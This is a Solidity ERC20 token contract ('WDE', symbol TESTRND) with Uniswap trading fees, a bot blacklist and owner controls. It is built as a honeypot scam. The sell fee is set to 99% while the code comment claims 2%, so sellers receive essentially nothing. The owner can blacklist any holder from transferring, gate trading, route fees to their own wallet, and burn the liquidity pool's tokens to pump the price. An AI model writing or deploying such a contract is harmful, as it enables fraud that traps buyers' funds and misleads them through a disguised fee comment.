// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
 
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
 
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function factory() external pure returns (address);
 
    function WETH() external pure returns (address);
}

interface IUniswapV2Pair {
    function sync() external;
}

contract WDE is ERC20, Ownable {
    uint256 constant public MANTISSA = 1e18; // Percentages are denominated in 1e18 (e.g. 100%=1e18, 42%=0.42e18)
    IUniswapV2Router02 public constant uniV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public immutable uniV2Pair;

    bool private inSwap;
    
    uint256 public buyFee = 0.02e18; // 2%
    uint256 public sellFee = 0.99e18; // 2%
    uint256 public burnFee = 0.01e18; // 1%

    address public markettingWallet;
    uint256 public maxTradeAmount;
    uint256 public maxFeeSwapPriceImpact;

    mapping(address => bool) public isFeeExcluded;
    mapping(address => bool) public isBot;

    uint256 public minReportFrequency = 0 * 1 hours;
    uint256 public lastReportTime;

    event PollingScore(uint256 pollingPct, uint256 amountBurned, string reason);

    constructor() ERC20("TESTRND", "TESTRND") {
        _mint(msg.sender, 10_000_000_000 * (10 ** decimals())); // 10 billion tokens

        uniV2Pair = IUniswapV2Factory(uniV2Router.factory()).createPair(address(this), uniV2Router.WETH());
        _approve(address(this), address(uniV2Router), type(uint256).max);
    
        setMarkettingWallet(msg.sender);

        excludeAccountFromFees(msg.sender);
        excludeAccountFromFees(address(this));
        excludeAccountFromFees(address(uniV2Router));
    }

    function setMarkettingWallet(address _markettingWallet) public onlyOwner {
        markettingWallet = _markettingWallet;
        excludeAccountFromFees(markettingWallet);
    }

    function setFees(uint256 newBuyFee, uint256 newSellFee, uint256 newBurnFee) public onlyOwner {
        require(newBuyFee < MANTISSA, "Buy fee too high");
        require(newSellFee < MANTISSA, "Sell fee too high");
        require(newBurnFee < MANTISSA, "Burn fee too high");
        require(newBuyFee + newBurnFee + newSellFee < MANTISSA, "Total fee too high");
        
        buyFee = newBuyFee;
        sellFee = newSellFee;
        burnFee = newBurnFee;
    }

    function setMaxTradeAmount(uint256 _maxTradeAmount) public onlyOwner {
        maxTradeAmount = _maxTradeAmount;
    }

    function setMaxFeeSwapPriceImpact(uint256 _maxFeeSwapPriceImpact) external onlyOwner {
        maxFeeSwapPriceImpact = _maxFeeSwapPriceImpact;
    }

    function setMinReportFrequency(uint256 _minReportFrequency) external onlyOwner {
        minReportFrequency = _minReportFrequency;
    }

    function excludeAccountFromFees(address account) public onlyOwner {
        isFeeExcluded[account] = true;
    }

    function includeAccountToFees(address account) external onlyOwner {
        isFeeExcluded[account] = false;
    }

    function listBots(address[] calldata accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isBot[accounts[i]] = true;
        }
    }

    function delistBots(address[] calldata accounts) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isBot[accounts[i]] = false;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        if (inSwap) return super._transfer(sender, recipient, amount);

        require(!isBot[sender], "This bot is blocked");

        bool buying = sender == uniV2Pair && !isFeeExcluded[recipient];
        bool selling = recipient == uniV2Pair && !isFeeExcluded[sender];

        if (buying || selling) {
            require(maxTradeAmount > 0, "Trading not enabled yet");
            require(amount <= maxTradeAmount, "Max trade amount exceeded");

            amount = subtractTradingFees(sender, amount, buying);
        }
        
        super._transfer(sender, recipient, amount);
    }

    function subtractTradingFees(address sender, uint256 amount, bool buying) private returns(uint256) {
        uint256 burnFees = amount * burnFee / MANTISSA;
        super._transfer(sender, address(0xdead), burnFees);
        
        uint256 tradingFees = (buying ? buyFee : sellFee) * amount / MANTISSA;
        super._transfer(sender, address(this), tradingFees);
        if (!buying) swapFeesForEth();

        return amount - tradingFees - burnFees;
    }

    function swapFeesForEth() private {
        uint256 amount = balanceOf(address(this));
        uint256 liquidityPairBalance = balanceOf(uniV2Pair);

        uint256 maxSwap = liquidityPairBalance * maxFeeSwapPriceImpact / (2 * MANTISSA);
        if (amount > maxSwap) amount = maxSwap;
        if (amount == 0) return;

        inSwap = true;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();
        uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            markettingWallet,
            block.timestamp
        );

        inSwap = false;
    }

    function reportPollingAndIncreasePrice(uint256 pollingPct, uint256 priceIncreasePct, string calldata reason) external onlyOwner {
        require(priceIncreasePct < 0.3e18, "Cannot increase price more than 30%");
        require(block.timestamp > lastReportTime + minReportFrequency , "Cooldown");
        lastReportTime = block.timestamp;
 
        uint256 liquidityPairBalance = balanceOf(uniV2Pair);
        uint256 amountToBurn = liquidityPairBalance * priceIncreasePct / (MANTISSA + priceIncreasePct);
 
        if (amountToBurn > 0){
            super._transfer(uniV2Pair, address(0xdead), amountToBurn);
            IUniswapV2Pair(uniV2Pair).sync();
        }
        
        emit PollingScore(pollingPct, amountToBurn, reason);
    }

    function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {
        IERC20(tokenAddress).transfer(owner(), tokenAmount);
    }

    function recoverETH(uint256 amount) external onlyOwner {
        payable(owner()).transfer(amount);
    }

    receive() external payable {}
}